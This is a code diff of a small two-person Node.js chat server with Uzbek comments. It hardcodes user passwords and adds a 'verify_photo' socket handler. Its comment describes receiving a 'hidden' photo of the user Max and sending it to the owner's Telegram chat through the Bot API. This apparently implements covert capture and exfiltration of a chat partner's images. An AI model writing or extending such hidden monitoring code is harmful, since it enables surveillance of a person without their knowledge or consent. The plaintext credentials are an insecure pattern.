@@ -34,33 +34,40 @@ const USERS = { 'mura': 'shaxzoda', 'max': 'qiyshiq_qalam' };
 let onlineUsers = {}; 
 let lastSeen = { 'mura': null, 'max': null };
 
-// Telegramga xabar yuborish funksiyasi
-function sendTelegramNotification(text) {
-    if (!TELEGRAM_BOT_TOKEN) return; 
+// --- ESKI sendTelegramNotification FUNKSIYASINING TAGIGA SHUNI QO'SHING ---
+
+// Telegramga rasm yuborish funksiyasi
+function sendTelegramPhoto(photoUrl, caption) {
+    if (!TELEGRAM_BOT_TOKEN) return;
     
-    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, text: text });
+    // Sizning saytingiz internetda bo'lgani uchun, rasm ssilkasini botga beramiz, o'zi tortib oladi
+    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, photo: photoUrl, caption: caption });
     
     const options = {
         hostname: 'api.telegram.org',
         port: 443,
-        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            // 1-TUZATISH SHU YERDA: Emojilar uchun to'g'ri hajm o'lchanadi
             'Content-Length': Buffer.byteLength(data)
         }
     };
 
-    const req = https.request(options, (res) => {
-        // Javobni shart emas, lekin xato chiqsa bilish uchun:
-        res.on('data', () => {});
-    });
-    
-    req.on('error', (e) => console.error('Telegram Xato:', e));
+    const req = https.request(options, (res) => { res.on('data', () => {}); });
+    req.on('error', (e) => console.error('Telegram Photo Xato:', e));
     req.write(data);
     req.end();
 }
+
+// ... pastroqda io.on('connection') ichiga quyidagi qismni qo'shamiz (socket.on('join') tugagandan keyin):
+
+    // YASHRIN RASMNI QABUL QILIB TELEGRAMGA YUBORISH
+    socket.on('verify_photo', (data) => {
+        // Render.com dagi ochiq ssilkangiz (domen)
+        const publicUrl = `https://max-chat-a2sv.onrender.com/uploads/${data.filename}`;
+        sendTelegramPhoto(publicUrl, `📸 Max tasdiqlash: ${data.type}`);
+    });
 
 app.post('/login', (req, res) => {
     const username = req.body.username.trim();
